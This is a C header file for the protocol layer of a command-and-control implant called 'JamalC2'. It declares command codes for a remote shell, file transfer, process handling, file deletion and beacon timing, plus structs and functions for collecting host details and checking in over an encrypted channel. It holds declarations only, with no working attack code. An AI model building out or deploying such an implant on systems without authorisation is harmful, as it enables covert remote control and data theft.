/*
 * JamalC2 Implant - Protocol Header
 */

#ifndef PROTOCOL_H
#define PROTOCOL_H

#include "crypto.h"
#include <stdint.h>

// Command types (from server)
#define CMD_NOP 0
#define CMD_SHELL 1
#define CMD_UPLOAD 2
#define CMD_DOWNLOAD 3
#define CMD_PROCESS 4
#define CMD_SYSINFO 5
#define CMD_EXIT 6
#define CMD_DIRLIST 7
#define CMD_INTERVAL 8 // Set beacon interval
#define CMD_DELETE 9   // Delete file

// Task structure
typedef struct {
  char *id;
  int command;
  char *args;
} Task;

// System info structure
typedef struct {
  char *hostname;
  char *username;
  char *os_version;
  char *ip_address;
  char *tag;
} SystemInfo;

// Checkin request/response
int protocol_checkin(CryptoContext *crypto, SystemInfo *info);

// Beacon (get tasks)
int protocol_beacon(CryptoContext *crypto, Task **tasks, int *task_count);

// Send task result
int protocol_send_result(CryptoContext *crypto, const char *task_id,
                         int success, const char *output);

// Free task list
void protocol_free_tasks(Task *tasks, int count);

// Get system info
void protocol_get_sysinfo(SystemInfo *info);

// Free system info
void protocol_free_sysinfo(SystemInfo *info);

#endif // PROTOCOL_H
